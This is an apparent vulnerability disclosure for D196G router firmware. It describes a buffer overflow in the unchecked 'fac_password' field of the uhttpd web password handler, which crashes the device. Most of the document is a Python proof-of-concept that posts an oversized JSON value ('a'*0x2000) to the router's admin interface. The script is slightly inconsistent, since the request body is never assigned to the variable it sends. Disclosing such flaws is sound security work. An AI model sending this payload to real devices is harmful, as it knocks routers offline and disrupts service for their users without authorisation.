Submittion Date: 2025.4.18  
Vendor: D196G  
Firmware: d196gv1-cn-up_2020-01-09_11.21.44   
Download Link: https://service.fastcom.com.cn/download-265.html  

The function sub_404CAEDC handles the important parameter string 'fac_password' without checking it, which leads to a buffer overflow vulnerability. After attacking, the device will crash (leading to DOS).

![image](image/uhttpd-mercury-2.png)

Exploit the vulnerability by sending a carefully constructed HTTP request
```python
import requests
##You need to modify the cookie first
# Destination URL
url = "http://192.168.1.1/stok=U%2B%7D!TC%2BK6c)SHSupXt8E%5BcuX2k5*X2%5Dk/ds "
# Request header
headers = {
    "Host": "192.168.1.1",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/json; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.1.1",
    "Referer": "http://192.168.1.1/"
}
# Request body - Vulnerability exploits json
{"uhttpd":{"webPwd":{"password":"a","fac_password":"a"*0x2000}},"method":"set"}
# Send POST request
response = requests.post(url, headers=headers, json=data)
# Output response content
print(response.text)
```

The exploitation is shown below.  
![image](image/mercury-1.png)
![image](image/mercury-2.png)
